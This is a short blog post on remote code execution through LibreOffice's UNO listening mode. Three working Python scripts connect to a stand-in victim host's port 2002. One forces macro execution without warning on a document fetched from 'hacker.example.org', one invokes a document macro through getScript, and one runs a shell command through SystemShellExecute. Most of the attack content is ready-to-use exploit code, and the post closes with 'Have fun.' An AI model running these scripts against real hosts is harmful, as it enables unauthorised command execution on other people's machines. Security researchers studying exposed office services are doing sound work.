---
layout: post
title: LibreOffice listening mode RCE
---

LibreOffice (as well as OpenOffice and other relatives) allows users to control the program remotely via [listening mode](https://wiki.openoffice.org/wiki/Documentation/DevGuide/ProUNO/Starting_OpenOffice.org_in_Listening_Mode). You can use this mode on any supported platform (Windows, Linux, Mac OS X).
Everything you need us start your office program with the following command:

`soffice -accept=socket,host=0,port=2002;urp;`

Office’s listening mode uses [Universal Network Objects (UNO)](https://www.openoffice.org/udk/common/man/uno.html) component model.
You can write your own scripts to use it with python3-uno package.
There are several ways to execute command on remote system using UNO in LibreOffice:
1. Open a document with macro in it with *MacroExecMode* set to [ALWAYS\_EXECUTE\_NO\_WARN](https://www.openoffice.org/api/docs/common/ref/com/sun/star/document/MacroExecMode.html#ALWAYS_EXECUTE_NO_WARN)
2. Open a document with macro and then call it with [getScript](https://www.openoffice.org/api/docs/common/ref/com/sun/star/script/provider/XScriptProvider.html#getScript) method
3. [SystemShellExecute](https://www.openoffice.org/api/docs/common/ref/com/sun/star/system/XSystemShellExecute.html#execute) method

Each method can be used with macro security set to **Very High**.

## ALWAYS\_EXECUTE\_NO\_WARN method
Create a document with macro in it. You can use MSF’s */exploit/multi/misc/openoffice_document_macro* or you can create it by yourself with *Shell* function of Basic language.
 
Assign your macro to document opening function via *Tools -> Customize -> Open Document*.

You don't need to upload your document with macro to host running LibreOffice, you can call it by URL instead.

```python
#!/usr/bin/env python3
import uno
docurl = "http://hacker.example.org/sploit.odt"
#docurl = "file:///tmp/uploaded/sploit.odt"
from com.sun.star.beans import PropertyValue
local = uno.getComponentContext()
resolver = local.ServiceManager.createInstanceWithContext("com.sun.star.bridge.UnoUrlResolver", local)
context = resolver.resolve("uno:socket,host=victim.example.org,port=2002;urp;StarOffice.ComponentContext")
desktop = context.ServiceManager.createInstanceWithContext("com.sun.star.frame.Desktop", context)
inProps = []
prop = PropertyValue()
prop.Name = "MacroExecutionMode"
prop.Value = 4 # ALWAYS_EXECUTE_NO_WARN
inProps.append(prop)  
document = desktop.loadComponentFromURL(docurl, "_blank", 0, tuple(inProps))
document.dispose()
```
 

## getScript method
 
Create a document with macro as in previous method, then directly call a macro inside the document with *getScript* and *invoke*.

```python
#!/usr/bin/env python3
import uno
docurl = "http://hacker.example.org/sploit.odt"
#docurl = "file:///tmp/uploaded/sploit.odt"
from com.sun.star.beans import PropertyValue
local = uno.getComponentContext()
resolver = local.ServiceManager.createInstanceWithContext("com.sun.star.bridge.UnoUrlResolver", local)
context = resolver.resolve("uno:socket,host=victim.example.org,port=2002;urp;StarOffice.ComponentContext")
desktop = context.ServiceManager.createInstanceWithContext("com.sun.star.frame.Desktop", context)
inProps = [] 
document = desktop.loadComponentFromURL(docurl, "_blank", 0, tuple(inProps))
model = desktop.getCurrentComponent()
sp = model.getScriptProvider()
sc = sp.getScript("vnd.sun.star.script:Standard.Module1.Main?language=Basic&location=document")
sc.invoke((),(),())
document.dispose()
```

## SystemShellExecute method

The best way to execute your command is to use *execute* method of *XSystemShellExecute* interface of API. You don't even need to create a document to use it.

```python
#!/usr/bin/env python3
import uno
from com.sun.star.beans import PropertyValue
local = uno.getComponentContext()
resolver = local.ServiceManager.createInstanceWithContext("com.sun.star.bridge.UnoUrlResolver", local)
context = resolver.resolve("uno:socket,host=victim.example.org,port=2002;urp;StarOffice.ComponentContext")
rc = context.ServiceManager.createInstanceWithContext("com.sun.star.system.SystemShellExecute", context)
rc.execute("/usr/bin/touch", "/tmp/PWNED", 1)
```

Have fun.



